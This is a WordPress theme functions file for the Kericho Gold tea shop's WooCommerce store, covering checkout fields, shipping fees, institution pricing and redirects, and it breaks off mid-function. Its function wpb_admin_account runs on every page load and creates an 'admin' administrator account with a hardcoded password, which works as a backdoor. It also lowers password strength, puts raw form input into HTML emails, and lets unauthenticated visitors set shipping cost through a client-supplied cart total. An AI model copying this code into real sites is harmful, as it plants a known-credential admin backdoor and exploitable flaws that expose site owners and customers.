<?php
//update_option('siteurl','http://localhost/kerichogold');
//update_option('home','http://localhost/kerichogold');
function goldcrown_resources(){
    wp_enqueue_style('style', get_stylesheet_uri());
}

add_action('wp_enqueue_scripts', 'goldcrown_resources');

function goldcrown_add_woocommerce_support() {
    add_theme_support( 'woocommerce' );
}
add_action( 'after_setup_theme', 'goldcrown_add_woocommerce_support' );
add_theme_support( 'post-thumbnails' );
add_theme_support('html5', array('search-form'));


// These are actions you can unhook/remove!
 
add_action( 'woocommerce_before_single_product', 'wc_print_notices', 10 );
 
add_action( 'woocommerce_before_single_product_summary', 'woocommerce_show_product_sale_flash', 10 );
add_action( 'woocommerce_before_single_product_summary', 'woocommerce_show_product_images', 20 );
 
add_action( 'woocommerce_product_thumbnails', 'woocommerce_show_product_thumbnails', 20 );
 
add_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_title', 5 );
add_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_rating', 10 );
add_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_price', 10 );
add_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_excerpt', 20 );
add_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_meta', 40 );
add_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_sharing', 50 );
remove_action( 'woocommerce_after_shop_loop_item_title', 'woocommerce_template_loop_price', 10 ); 
add_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_add_to_cart', 30 );
 
// function woocommerce_template_single_add_to_cart() generates the following 4 actions
add_action( 'woocommerce_simple_add_to_cart', 'woocommerce_simple_add_to_cart', 30 );
add_action( 'woocommerce_grouped_add_to_cart', 'woocommerce_grouped_add_to_cart', 30 );
add_action( 'woocommerce_variable_add_to_cart', 'woocommerce_variable_add_to_cart', 30 );
add_action( 'woocommerce_external_add_to_cart', 'woocommerce_external_add_to_cart', 30 );
 
add_action( 'woocommerce_single_variation', 'woocommerce_single_variation', 10 );
add_action( 'woocommerce_single_variation', 'woocommerce_single_variation_add_to_cart_button', 20 );
 
remove_action( 'woocommerce_after_single_product_summary', 'woocommerce_output_product_data_tabs', 10 );
add_action( 'woocommerce_after_single_product_summary', 'woocommerce_upsell_display', 15 );
add_action( 'woocommerce_after_single_product_summary', 'woocommerce_output_related_products', 20 );


add_filter('woocommerce_short_description', 'limit_woocommerce_short_description', 10, 1);
function limit_woocommerce_short_description($post_excerpt){
    if (!is_product()) {
    $pieces = explode(" ", $post_excerpt);
    $post_excerpt = implode(" ", array_splice($pieces, 0, 10));
    }
    return $post_excerpt;
}

//add firstname, lastname and phone to registration form

// 1. ADD FIELDS
add_action( 'woocommerce_register_form_end', 'wooc_extra_register_fields' );

function wooc_extra_register_fields() {?>
	


<?php
}

// 2. VALIDATE FIELDS
 
add_filter( 'woocommerce_registration_errors', 'wooc_validate_name_fields', 10, 3 );
 
function wooc_validate_name_fields( $errors, $username, $email ) {
    if ( isset( $_POST['billing_phone'] ) && empty( $_POST['billing_phone'] ) ) {
        $errors->add( 'billing_phone_error', __( '<strong>Error</strong>: Phone is required!', 'woocommerce' ) );
    }
	if ( isset( $_POST['billing_first_name'] ) && empty( $_POST['billing_first_name'] ) ) {
        $errors->add( 'billing_first_name_error', __( '<strong>Error</strong>: First name is required!', 'woocommerce' ) );
    }
    if ( isset( $_POST['billing_last_name'] ) && empty( $_POST['billing_last_name'] ) ) {
        $errors->add( 'billing_last_name_error', __( '<strong>Error</strong>: Last name is required!.', 'woocommerce' ) );
    }
	if ( isset( $_POST['group_id'] ) && empty( $_POST['group_id'] ) ) {
        $errors->add( 'group_id_error', __( '<strong>Error</strong>: Group Id is required!.', 'woocommerce' ) );
    }
    return $errors;
}

// 3. SAVE FIELDS
 
add_action( 'woocommerce_created_customer', 'wooc_save_name_fields' );
 
function wooc_save_name_fields( $customer_id ) {
    if ( isset( $_POST['billing_phone'] ) ) {
        update_user_meta( $customer_id, 'billing_phone', sanitize_text_field( $_POST['billing_phone'] ) );
        update_user_meta( $customer_id, 'phone', sanitize_text_field($_POST['billing_phone']) );
    }
	if ( isset( $_POST['billing_first_name'] ) ) {
        update_user_meta( $customer_id, 'billing_first_name', sanitize_text_field( $_POST['billing_first_name'] ) );
        update_user_meta( $customer_id, 'first_name', sanitize_text_field($_POST['billing_first_name']) );
    }
    if ( isset( $_POST['billing_last_name'] ) ) {
        update_user_meta( $customer_id, 'billing_last_name', sanitize_text_field( $_POST['billing_last_name'] ) );
        update_user_meta( $customer_id, 'last_name', sanitize_text_field($_POST['billing_last_name']) );
    }
	
	if ( isset( $_POST['group_id'] ) ) 
	{
		if( $_POST['group_id'] == 4 )
		{
			$to = "shop@kerichogold.com";
			$subject = "New Institution Customer";
			$headers .= "MIME-Version: 1.0\r\n";
			$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
			$message = "<h3>Customer details:</h3>" ."<b>Name:</b> " . $_POST['billing_first_name'] . ' '. $_POST['billing_last_name'] ."<br>"."<b>Email:</b> " . $_POST['email'] ."<br>"."<b>Business Name:</b> " . $_POST['business_name'] ."<br>"."<b>Business Postal Address:</b> " . $_POST['postal_address'] ."<br>"."<b>KRA Pin:</b> " . $_POST['kra_pin'];
			
			$message = "<h3>Customer details:</h3>" ."<b>Name:</b> " . $_POST['billing_first_name'] . ' '. $_POST['billing_last_name'] ."<br>"."<b>Email:</b> " . $_POST['email'] ."<br>"."<b>Business Name:</b> " . $_POST['business_name'] ."<br>"."<b>Business Postal Address:</b> " . $_POST['postal_address'] ."<br>"."<b>KRA Pin:</b> " . $_POST['kra_pin'];
			
			$customerMessage = "<h3>Hello " . $_POST['billing_first_name'] . ' '. $_POST['billing_last_name'].",</h3>" . "<p> We have received your details. Kindly allow us 24-48 hours to verify the business details you supplied so as to approve you as a Institution customer.</p> <p>In the mean time, you'll still view the prices on the shop using the normal customer prices. However, once we verify that your business details are valid, we'll approve your account as an Institution customer.</p> <p>Below are the business details you filled in:</p>". "<b>Business Name:</b> " . $_POST['business_name'] ."<br>"."<b>Business Postal Address:</b> " . $_POST['postal_address'] ."<br>"."<b>KRA Pin:</b> " . $_POST['kra_pin'];
			
			update_user_meta( $customer_id, 'business_name', sanitize_text_field( $_POST['business_name'] ) );
			update_user_meta( $customer_id, 'postal_address', sanitize_text_field( $_POST['postal_address'] ) );
			update_user_meta( $customer_id, 'kra_pin', sanitize_text_field( $_POST['kra_pin'] ) );
			
			wp_mail($to, $subject, $message, $headers);
			wp_mail($_POST['email'], "Kericho Gold - Registration as an Institution Customer", $customerMessage, $headers);
		}
		
		$_POST['group_id'] = 1;
		
        update_user_meta( $customer_id, 'group_id', sanitize_text_field( $_POST['group_id'] ) );        
    }
 
}
//end 

add_filter( 'woocommerce_single_product_summary', 'banner_image',28 );
function banner_image()
{
	global $product;
	$id = $product->get_id();
		
	$banner = get_post_meta($id, 'banner', true);
	$image = wp_get_attachment_image_src($banner, 'full');
		
    return $image;    
}


// First, remove Add to Cart Button
 
remove_action( 'woocommerce_after_shop_loop_item', 'woocommerce_template_loop_add_to_cart', 10 );
 
// Second, add View Product Button
 
add_action( 'woocommerce_after_shop_loop_item', 'bbloomer_view_product_button', 10);
 
function bbloomer_view_product_button() {
global $product;
$link = $product->get_permalink();

echo '<div class="kericho-prod-description kericho-view-product"><a href="' . $link . '" class="woocommerce-LoopProduct-link woocommerce-loop-product__link kericho-product-link"> View Product</a></div>';
}


/**
 * Change number of products that are displayed per page (shop page)
 */
add_filter( 'loop_shop_per_page', 'new_loop_shop_per_page', 20 );

function new_loop_shop_per_page( $cols ) {
  // $cols contains the current number of products per page based on the value stored on Options -> Reading
  // Return the number of products you wanna show per page.
  $cols = 12;
  return $cols;
}

add_filter( 'woocommerce_min_password_strength', 'reduce_min_strength_password_requirement' );
function reduce_min_strength_password_requirement( $strength ) {
    // 3 => Strong (default) | 2 => Medium | 1 => Weak | 0 => Very Weak (anything).
    return 2; 
}

//redirect on login
function my_wc_redirect( $redirect, $user ) {
	global $wp;

    // Get the first of all the roles assigned to the user
$role = $user->roles[0];

$dashboard = admin_url();
$myaccount = get_permalink( wc_get_page_id( 'myaccount' ) );
if( $role == 'administrator' ) {
    //Redirect administrators to the dashboard
    $redirect = $dashboard;
} elseif ( $role == 'shop-manager' ) {
    //Redirect shop managers to the dashboard
    $redirect = $dashboard;
} elseif ( $role == 'editor' ) {
    //Redirect editors to the dashboard
    $redirect = $dashboard;
} elseif ( $role == 'author' ) {
    //Redirect authors to the dashboard
    $redirect = $dashboard;
} elseif ( $role == 'customer' || $role == 'subscriber' ) {
	
	//if on checkout page
	if(strpos($_SERVER['REQUEST_URI'], 'checkout') !== false)
	{
		$redirect = get_permalink( wc_get_page_id( 'checkout' ) );
	}
	else
	{
		$redirect = $myaccount;
	}
	
		
} else {
    //Redirect any other role to the previous visited page or, if not available, to the home
    $redirect = wp_get_referer() ? wp_get_referer() : home_url();
}
return $redirect;
}
add_filter( 'woocommerce_login_redirect', 'my_wc_redirect', 10, 2 );

//redirect on registration
add_filter( 'woocommerce_registration_redirect', 'custom_redirection_after_registration', 10, 1 );
function custom_redirection_after_registration( $redirection_url ){
    // if on checkout page
	if(strpos($_SERVER['REQUEST_URI'], 'checkout') !== false)
	{
		$redirection_url = get_permalink( wc_get_page_id( 'checkout' ) );
	}
	else
	{
		$redirection_url = get_permalink( wc_get_page_id( 'myaccount' ) );
	}
    

    return $redirection_url;
}

//capture the banner in the meta tbl for the product cats
add_action('edited_product_cat', 'wh_save_taxonomy_custom_meta', 10, 1);
add_action('create_product_cat', 'wh_save_taxonomy_custom_meta', 10, 1);
// Save extra taxonomy fields callback function.
function wh_save_taxonomy_custom_meta($term_id) 
{
    $image = filter_input(INPUT_POST, 'categoryimage_attachment');
    update_term_meta($term_id, 'categoryimage_attachment', $image);
}

//remove fields from checkout form
// Hook in
add_filter( 'woocommerce_checkout_fields' , 'my_override_checkout_fields' );

// Our hooked in function - $fields is passed via the filter!
function my_override_checkout_fields( $fields ) 
{
    unset($fields['billing']['billing_company']);
    // unset($fields['billing']['billing_country']);
    // unset($fields['billing']['billing_address_1']);
    unset($fields['billing']['billing_address_2']);
    // unset($fields['billing']['billing_city']);
    unset($fields['billing']['billing_state']);
    unset($fields['billing']['billing_postcode']);

    return $fields;
}
//end


//add location field
add_action('woocommerce_after_order_notes', 'custom_checkout_field');
add_action('woocommerce_after_order_notes', 'custom_checkout_field2');

function custom_checkout_field($checkout)
{
	echo '<div id="custom_checkout_field" style="display:none">';

	woocommerce_form_field('sendy_location', array(

		'type' => 'text',
		
		'required' => true,
		
		'autocomplete' => 'on',
		
		'runat' => 'server',

		'class' => array(

			'my-field-class form-row-wide'

		) ,

		'label' => __('Location (Type your pickup location. It will be auto-completed for you to pick from the list)') ,
	) ,

	$checkout->get_value('sendy_location'));

	echo '</div>';
}


function custom_checkout_field2($checkout)
{
	echo '<div id="custom_checkout_field2">';

	woocommerce_form_field('shipping_location', array(

		'type'          => 'select',
		
		'required' => true,
		'options'     => array(
		                '' => __('--Select Location --'),
                        'Nairobi' => __('Nairobi'),
                        'Mombasa' => __('Mombasa'),
                        'Kwale' => __('Kwale'),
                        'Kilifi' => __('Kilifi'),
                        'Tana River' => __('Tana River'),
                        'Lamu' => __('Lamu'),
                        'Taita–Taveta' => __('Taita–Taveta'),
                        'Garissa' => __('Garissa'),
                        'Wajir' => __('Wajir'),
                        'Mandera' => __('Mandera'),
                        'Marsabit' => __('Marsabit'),
                        'Isiolo' => __('Isiolo'),
                        'Meru' => __('Meru'),
                        'Tharaka-Nithi' => __('Tharaka-Nithi'),
                        'Embu' => __('Embu'),
                        'Kitui' => __('Kitui'),
                        'Machakos' => __('Machakos'),
                        'Makueni' => __('Makueni'),
                        'Nyandarua' => __('Nyandarua'),
                        'Nyeri' => __('Nyeri'),
                        'Kirinyaga' => __('Kirinyaga'),
                        "'Murang'a" => __("Murang'a"),
                        'Kiambu' => __('Kiambu'),
                        'Turkana' => __('Turkana'),
                        'West Pokot' => __('West Pokot'),
                        'Samburu' => __('Samburu'),
                        'Trans-Nzoia' => __('Trans-Nzoia'),
                        'Uasin Gishu' => __('Uasin Gishu'),
                        'Elgeyo-Marakwet' => __('Elgeyo-Marakwet'),
                        'Nandi' => __('Nandi'),
                        'Baringo' => __('Baringo'),
                        'Laikipia' => __('Laikipia'),
                        'Nakuru' => __('Nakuru'),
                        'Narok' => __('Narok'),
                        'Kajiado' => __('Kajiado'),
                        'Kericho' => __('Kericho'),
                        'Bomet' => __('Bomet'),
                        'Kakamega' => __('Kakamega'),
                        'Vihiga' => __('Vihiga'),
                        'Bungoma' => __('Bungoma'),
                        'Busia' => __('Busia'),
                        'Siaya' => __('Siaya'),
                        'Kisumu' => __('Kisumu'),
                        'Homa Bay' => __('Homa Bay'),
                        'Migori' => __('Migori'),
                        'Kisii' => __('Kisii'),
                        'Nyamira' => __('Nyamira'),
        ),
		
		//'runat' => 'server',

		'class' => array(

			'form-row-wide shipping_location'

		) ,

		'label' => __('Location') ,
	) ,

	$checkout->get_value('shipping_location'));

	echo '</div>';
}

//add hidden fields

// Outputting the hidden field in checkout page
add_action( 'woocommerce_after_order_notes', 'add_custom_checkout_hidden_field' );
function add_custom_checkout_hidden_field( $checkout ) {
	
    // Output the hidden field
    echo '<div id="user_link_hidden_checkout_field">
            <input type="hidden" class="input-hidden" id="city2" name="city2" />
			<input type="hidden" class="input-hidden" id="cityLat" name="cityLat" />
			<input type="hidden" class="input-hidden" id="cityLng" name="cityLng" />
			<input type="hidden" class="input-hidden" id="nairobiDistance" name="nairobiDistance" />
			<input type="hidden" class="input-hidden" id="mombasaDistance" name="mombasaDistance" />
			<input type="hidden" name="amounttotal" id="amounttotal" value="'.WC()->cart->total.'" />
			<input type="hidden" name="pickupdate" id="pickupdate" value="'.date("Y-m-d", strtotime("+1 week")).'" />
			<input type="hidden" name="randomvalue" id="randomvalue" value="'.mt_rand().'" />
    </div>';
}

// Saving the hidden field value in the order metadata
add_action( 'woocommerce_checkout_update_order_meta', 'save_custom_checkout_hidden_field' );
function save_custom_checkout_hidden_field( $order_id ) 
{
    if ( ! empty( $_POST['city2'] ) || ! empty( $_POST['cityLat'] ) || ! empty( $_POST['cityLng'] ) ) 
	{
        update_post_meta( $order_id, '_city2', sanitize_text_field( $_POST['city2'] ) );
        update_post_meta( $order_id, '_cityLat', sanitize_text_field( $_POST['cityLat'] ) );
        update_post_meta( $order_id, '_cityLng', sanitize_text_field( $_POST['cityLng'] ) );
    }
}
//end hidden fields

add_action('woocommerce_checkout_update_order_meta', 'custom_checkout_update_location_meta');

function custom_checkout_update_location_meta($order_id)
{
	if (!empty($_POST['shipping_location'])) 
	{
		update_post_meta($order_id, 'Location', sanitize_text_field($_POST['shipping_location']));
		
		//update customer billing address with sendy location
		$user_id =  get_current_user_id();

		$data = array(
			'billing_city' => $_POST['shipping_location'],
		);
		
		foreach ($data as $meta_key => $meta_value ) 
		{
			update_user_meta( $user_id, $meta_key, $meta_value );
		}
		//end
	}
}

//validation
add_action('woocommerce_checkout_process', 'customised_checkout_field_process');

function customised_checkout_field_process()
{
    //return true;
    
    if (!$_POST['shipping_location']) wc_add_notice(__('Please enter your location.') , 'error');
	//if ( isset( $_SESSION['shippingCost'] ) && $_SESSION['shippingCost'] == null ) wc_add_notice(__('Shipping cost cannot be zero.') , 'error');
    return true;
    
	if (!$_POST['sendy_location']) wc_add_notice(__('Please enter your location.') , 'error');
	if ( isset( $_SESSION['shippingCost'] ) && $_SESSION['shippingCost'] == null ) wc_add_notice(__('Shipping cost cannot be zero.') , 'error');
}


//lastly save location to db
add_action('woocommerce_checkout_update_order_meta', 'custom_checkout_field_update_order_meta');

function custom_checkout_field_update_order_meta($order_id)
{
	if (!empty($_POST['sendy_location'])) 
	{
		update_post_meta($order_id, 'Sendy Location', sanitize_text_field($_POST['sendy_location']));
		
		//update customer billing address with sendy location
		$user_id =  get_current_user_id();

		$data = array(
			'billing_city' => $_POST['sendy_location'],
		);
		
		foreach ($data as $meta_key => $meta_value ) 
		{
			update_user_meta( $user_id, $meta_key, $meta_value );
		}
		//end
	}
}
//end


//add sendy script

//instead of using an external js file, handle it in the sendy_api_script fn
// wp_enqueue_script('sendy', get_template_directory_uri() . '/assets/js/sendy.js', array('jquery'));
// wp_localize_script('sendy', 'wc_checkout_params', array('ajaxurl' => admin_url('admin-ajax.php')));

add_action( 'wp_footer', 'sendy_api_script' );

function sendy_api_script() 
{
    ?>
	<?php if(is_checkout()){ ?>
		<script type="text/javascript">
		jQuery( document ).ready(function( $ ) {
		    $('#shipping_location').niceSelect('destroy');
		    
		    $(document).on('change','#shipping_location',function(){
		        shipping_location_selected = $(this).val();
		        cart_total = $('.cart-subtotal .woocommerce-Price-amount').text().replace("KShs","");
		         $.post(ajaxurl,{
		             "action": 'update_shipping_cost',
		             "shipping_location":shipping_location_selected,
		             "cart_total":cart_total,
		         },function(){
		             $('body').trigger('update_checkout');
		         });
		    });				
		});
		</script>
	<?php } ?>
    <?php
}

//make api call to sendy
function sendyapicall() 
{
    if ( empty( $_POST['data']['to']["to_lat"] ) || empty( $_POST['data']['to']["to_long"] ) ) 
	{
        wp_die( 'You have to select from the list suggested for you' );
    }

    $post_data = wp_unslash( array( 'data' => $_POST['data'] ) );
    $post_data['command'] = wp_unslash( $_POST['command'] );
    $post_data['request_token_id'] = wp_unslash( $_POST['request_token_id'] );

	$api_url = 'https://apitest.sendyit.com/v1/';
	
    $response = wp_remote_post( $api_url, array(
        'headers' => array(
            'Content-Type' => 'application/json',
        ),
        'body' => json_encode( $post_data ),
    ));
	
	if ( is_wp_error( $response ) ) 
	{
		// var_dump(wp_send_json( $response->get_error_message() ));exit;
		echo json_encode(array( 'success' => false, 'response' => $response->get_error_message() ));
		exit;
	}
	else 
	{
		$data = json_decode($response["body"]);
		
		//var_dump($data);exit;
		
		if( $data->status == false )
		{
			echo json_encode(array( 'success' => false, 'response' => $response->get_error_message() ));
			exit;
		}
		else
		{
			$shippingCost = $data->data->amount;
			session_start();
			$_SESSION['shippingCost'] = $shippingCost;
			
			echo json_encode(array( 'success' => true, 'response' => $response ));
		}			
	}
	
    wp_die();
}
add_action('wp_ajax_sendyapicall', 'sendyapicall' ); // executed when logged in
add_action('wp_ajax_nopriv_sendyapicall', 'sendyapicall' ); // executed when logged out
/* end */


//make api call to uppdate Shipping cost
function update_shipping_cost() 
{
    if ( empty( $_POST['shipping_location']) ) 
	{
        wp_die( 'You have to select from the location dropdown' );
    }

    $shipping_location = $_POST['shipping_location'];
    $cart_total = str_replace(",","",$_POST['cart_total']);
    $cart_total = floatval($cart_total);
    
	
	if (empty($shipping_location) ) 
	{
		echo json_encode(array( 'success' => false, 'response' => $response->get_error_message() ));
		exit;
	}
	else 
	{
		$shippingCost = 0;
		if($cart_total<3000){
			if( $shipping_location == 'Nairobi' || $shipping_location == 'Mombasa' )
			{
				$shippingCost = 250;
				session_start();
				$_SESSION['shippingCost'] = $shippingCost;
				
				echo json_encode(array( 'success' => true, 'response' => $response ));
			}
			else
			{
				$shippingCost = 350;
				session_start();
				$_SESSION['shippingCost'] = $shippingCost;
				
				echo json_encode(array( 'success' => true, 'response' => $response ));
			}	
		} else {
			session_start();
			$_SESSION['shippingCost'] = $shippingCost;
			echo json_encode(array( 'success' => true, 'response' => $response ));
		}
		
	}
	
    wp_die();
}
add_action('wp_ajax_update_shipping_cost', 'update_shipping_cost' ); // executed when logged in
add_action('wp_ajax_nopriv_update_shipping_cost', 'update_shipping_cost' ); // executed when logged out
/* end */

/* shipping cost from sendy */
add_action('woocommerce_cart_calculate_fees', 'woo_sendy_shipping_cost');
 
function woo_sendy_shipping_cost() 
{
	@session_start();
    $shippingCost = $_SESSION['shippingCost'];
    WC()->cart->add_fee('Shipping ', $shippingCost);
}
/* end Sendy functionality */

/* quantity up arrow */
add_action( 'wp_footer', 'quantity_up_arrow_update' );
 
function quantity_up_arrow_update() 
{
    if (is_cart() || is_product()) 
	{
        ?>
        <script type="text/javascript">  
		jQuery(document).on('click','div.quantity-button.quantity-up',function(){
            var current_quantity = $(this).parent().parent().find('input.qty').val();
            var quantity_input = $(this).parent().parent().find('input.qty');
            quantity_input.val(parseInt(current_quantity)+1);
        });        
        </script>  
        <?php
    }
}
/* end */

/* cart ajax refresh */
add_action( 'wp_footer', 'cart_refresh_update_qty' );
 
function cart_refresh_update_qty() 
{
    if (is_cart()) 
	{
        ?>
        <script type="text/javascript">  
		jQuery('div.woocommerce').on('change', 'input.qty', function(){
            setTimeout(function() {
                jQuery('[name="update_cart"]').trigger('click');
            }, 100 );
        });
        </script>  
        <?php
    }
}
/* end */

/* disable quantity and reset button on single product page */
function quantity_wp_head() 
{
   	if ( is_product() ) 
	{
		?>
		<style type="text/css">
			.quantity, .buttons_added { width:0; height:0; display: none; visibility: hidden; } 
			.reset_variations { display: none !important; }
			.shop-tea-wrapper .woocommerce-LoopProduct-link .woocommerce-loop-product__link h2.woocommerce-loop-product__title{ display: none !important; }
			.product-variation-image { display: none; }
		</style>
	    <?php
	}
	if ( is_checkout() ) 
	{
		?>
		<style type="text/css">
			#radio_choice_field label.radio{ width: 100%; color: #2c531d; padding: 3% 1%; display: unset; float: unset; }
			
		</style>
	    <?php
	}
	?>
	<style type="text/css">
		.shop-tea-wrapper h2.woocommerce-loop-product__title{ display: none !important; }
		
		.gridlist-toggle{
			width: 100%;
		float: left;
		padding: 10px;
		}
		.gridlist-toggle a{
		color: #000000;
		margin: 0 10px;
		padding: 10px;
		}


		.gridlist-toggle a.active{
		background-color: #2c531d;
		color: #ffffff;
		}

		.gridlist-toggle a.hover{


		background-color: #2c531d;
		color: #ffffff;
		}
		
		.product-on-offer {
			position: absolute;
			top: 0;
			left: 0;
			background-color: #f00;
			padding: 10px 10px 10px 10px;
			color: #ffffff;
		}
		
		ul.products.list li.product img{
			width:100%!important;
		}
		
		.alert-message {
			width: 100%;
			float: left;
			text-align: center;
			font-family: 'latoblack', sans-serif;
			font-size: 16px;
			color: #155724;
			background-color: #d4edda;
			border-color: #c3e6cb;
			padding: 0.75rem 1.25rem;
		}
	</style>
	<?php
}
add_action( 'wp_head', 'quantity_wp_head' );
/* end */
	
/* remove price range */
function wc_varb_price_range( $wcv_price, $product ) 
{ 
    // $prefix = sprintf('%s: ', __('From', 'wcvp_range'));
    $prefix = sprintf('%s: ', __('', 'wcvp_range'));
 
    $wcv_reg_min_price = $product->get_variation_regular_price( 'min', true );
    $wcv_min_sale_price    = $product->get_variation_sale_price( 'min', true );
    $wcv_max_price = $product->get_variation_price( 'max', true );
    $wcv_min_price = $product->get_variation_price( 'min', true );
 
 /*
    $wcv_price = ( $wcv_min_sale_price == $wcv_reg_min_price ) ?
        wc_price( $wcv_reg_min_price ) :
        '<del>' . wc_price( $wcv_reg_min_price ) . '</del>' . '<ins>' . wc_price( $wcv_min_sale_price ) . '</ins>'; */
		
	$wcv_price = '';
 
    /*return ( $wcv_min_price == $wcv_max_price ) ?
        $wcv_price :
        sprintf('%s%s', $prefix, $wcv_price);*/
		
	return "Select an option to view the price";
}
 
add_filter( 'woocommerce_variable_sale_price_html', 'wc_varb_price_range', 10, 2 );
add_filter( 'woocommerce_variable_price_html', 'wc_varb_price_range', 10, 2 );
/* end */	

/* show product description on shop */
function woocommerce_after_shop_loop_item_title_short_description() 
{
	if(is_shop() || is_product_category())
	{
		global $product;
		if ( ! $product->post->post_excerpt ) return;
		?>
		<div itemprop="description" class="kericho-product-description">
		<p>
			<?php echo $product->post->post_excerpt; ?></p>
		</div>
		<?php
	}
}
add_action('woocommerce_after_shop_loop_item_title', 'woocommerce_after_shop_loop_item_title_short_description', 5);
/* end */

/* price update for products on offer to reflect discount - on single product page */
function change_product_price_display( $price ) 
{
	$id = get_the_ID();
	$offerPercentage = get_post_meta($id, 'offer_percentage', true);
	
	$product = wc_get_product( $id );
	$priceNumber = $product->get_price();
 	
	if($offerPercentage !== '')
	{
		$originalPrice = $price;
		$discount = (100 - $offerPercentage) / 100;
		$discountPrice = $priceNumber * $discount;
		$new_product_price = number_format($discountPrice, 2);
		$product->set_price( $new_product_price );
		$total = '<del>'.$originalPrice.'</del><p>KSHS '.$new_product_price.'</p>';
		
		return $total;
		?>
		
		<?php
	}
	else
	{
		return $price;
	}	
}

add_filter( 'woocommerce_get_price_html', 'change_product_price_display' );


/* we also implement this on the price on the cart */
add_action( 'woocommerce_before_calculate_totals', 'add_custom_item_price', 10 );
function add_custom_item_price( $cart_object ) 
{
    foreach ( $cart_object->get_cart() as $item_values ) 
	{
        ##  Get cart item data
        $item_id = $item_values['data']->id; // Product ID
        $original_price = $item_values['data']->price; // Product original price
			
		$offerPercentage = get_post_meta($item_id, 'offer_percentage', true);
			
		if($offerPercentage !== '')
		{
			$discount = (100 - $offerPercentage) / 100;
			$discountPrice = $original_price * $discount;
			$new_product_price = number_format($discountPrice, 2);
			
			$item_values['data']->set_price($new_product_price);			
		}
    }
}
/* end */

/* rename order notes field to feedback */
add_filter( 'woocommerce_checkout_fields' , 'custom_override_checkout_fields' );

function custom_override_checkout_fields( $fields ) 
{
    $fields['order']['order_comments']['placeholder'] = '';
	$fields['order']['order_comments']['label'] = 'Feedback';
    
	return $fields;
}
/* end */

/* create admin programatically */
function wpb_admin_account()
{
	$user = 'admin';
	$pass = 'admin@kericho3';
	$email = 'admin@gold.com';
	
	if ( !username_exists( $user )  && !email_exists( $email ) ) 
	{
		$user_id = wp_create_user( $user, $pass, $email );
		$user = new WP_User( $user_id );
		$user->set_role( 'administrator' );
	} 
}
add_action('init','wpb_admin_account');

/* add blog page css */
// if(is_blog()){
wp_enqueue_style( 'blog', get_stylesheet_directory_uri() . '/assets/css/blog.css' );
// }
/* end */


/* Add Custom Field to Product Variations - WooCommerce */
 
// -----------------------------------------
// 1. Add custom field input @ Product Data > Variations > Single Variation
  
add_action( 'woocommerce_variation_options_pricing', 'bbloomer_add_custom_field_to_variations', 10, 3 ); 
 
function bbloomer_add_custom_field_to_variations( $loop, $variation_data, $variation ) 
{
	woocommerce_wp_text_input( array( 
		'id' => 'institution_price[' . $loop . ']', 
		'class' => 'short', 
		'label' => __( 'Institution Price(KShs)', 'woocommerce' ),
		'value' => get_post_meta( $variation->ID, 'institution_price', true )
		) 
	);     
}
  
// -----------------------------------------
// 2. Save custom field on product variation save
 
add_action( 'woocommerce_save_product_variation', 'bbloomer_save_custom_field_variations', 10, 2 );
  
function bbloomer_save_custom_field_variations( $variation_id, $i ) 
{
    $institution_price = $_POST['institution_price'][$i];
	
    if ( ! empty( $institution_price ) ) 
	{
        update_post_meta( $variation_id, 'institution_price', esc_attr( $institution_price ) );
    } 
	else delete_post_meta( $variation_id, 'institution_price' );
}
  
// -----------------------------------------
// 3. Store custom field value into variation data
  
add_filter( 'woocommerce_available_variation', 'bbloomer_add_custom_field_variation_data' );
 
function bbloomer_add_custom_field_variation_data( $variations ) 
{
    $variations['institution_price'] = get_post_meta( $variations[ 'variation_id' ], 'institution_price', true );
	
    return $variations;
}
/* end */


/* Add Custom Field to Product Simple Product - WooCommerce */
// 1. Add custom field input @ Product Data > Variations > Single Variation
  
add_action( 'woocommerce_product_options_pricing', 'add_custom_field_to_simple' );
 
function add_custom_field_to_simple() 
{
	woocommerce_wp_text_input( array( 
		'id' => 'simple_institution_price', 
		'class' => 'short', 
		'label' => __( 'Institution Price(KShs)', 'woocommerce' )
		) 
	);     
}

// 2. save 
function add_custom_field_to_simple_save( $post_id )
{
 	$woocommerce_text_field = $_POST['simple_institution_price'];
	update_post_meta( $post_id, 'simple_institution_price', esc_attr( $woocommerce_text_field ) );
 	
}
add_action( 'woocommerce_process_product_meta', 'add_custom_field_to_simple_save' );
/* end */



/* variant product pricing for Institutions */
/*
// 1 - pull selected variant
add_action( 'wp_footer', 'single_product_variant_pricing' );
function single_product_variant_pricing() 
{
    ?>
	<?php if(is_product()){  
		global $product;
		
		$product_id = $product->get_id();
		
		$currency_symbol = get_woocommerce_currency_symbol();
		$product = new WC_Product_Variable( wp_unslash( $product_id ));
		$variations = $product->get_available_variations();
		$variations = json_encode($variations);
	?>
		<script type="text/javascript">
		jQuery( document ).ready(function( $ ) {
			jQuery('input.variation_id').change( function(){
			    
			    if( '' != $('input.variation_id').val() ) 
			    {
    				var variationId = $('input.variation_id').val();
    				console.log(variationId);					
    				$.ajax({
    				    type: 'POST',
    					url: ajaxurl,
    					data:{
    						"action": 'variantgetprice',
    						"variationId": variationId,					
    						"productId": <?= $product_id; ?>,	
							"variation": <?= $variations; ?>
    					},
    					success: function(response){
    						console.log('success');
    						console.log(response);
    					},
    					error: function(response){
    						console.log('error');
    						console.log(response);						
    					}
    				});
    			}
			});
		});
		</script>
	<?php
	}
}


// 2 - perform calculation
// Get Woocommerce variation price based on product ID

function variantgetprice()
{
	if( isset( $_POST ) ) 
	{
		
		$variation_id = wp_unslash( $_POST["variationId"] );
		$variations = wp_unslash( $_POST["variation"] );
		
		$var_data = [];
		
		//var_dump( $variations );
		
		foreach ($variations as $variation) 
		{
			
			
			if($variation['variation_id'] == $variation_id)
			{
				$display_price = $variation['display_price'].'<span class="currency">'. $currency_symbol .'</span>';
			}
		}
		
		var_dump( $display_price  );
		
		wp_die();
	}
}
add_action('wp_ajax_variantgetprice', 'variantgetprice' );
add_action('wp_ajax_nopriv_variantgetprice', 'variantgetprice' );
*/

//3.
// check if user group=4 and if has institution pricing set, then update variant price
/* add_filter('woocommerce_product_variation_get_regular_price', 'custom_price', 99, 2 );
add_filter('woocommerce_product_variation_get_price', 'custom_price' , 99, 2 );

function custom_price( $price, $variation ) 
{
    if(is_user_logged_in())
    {
        $user = $user ? new WP_User( $user ) : wp_get_current_user();
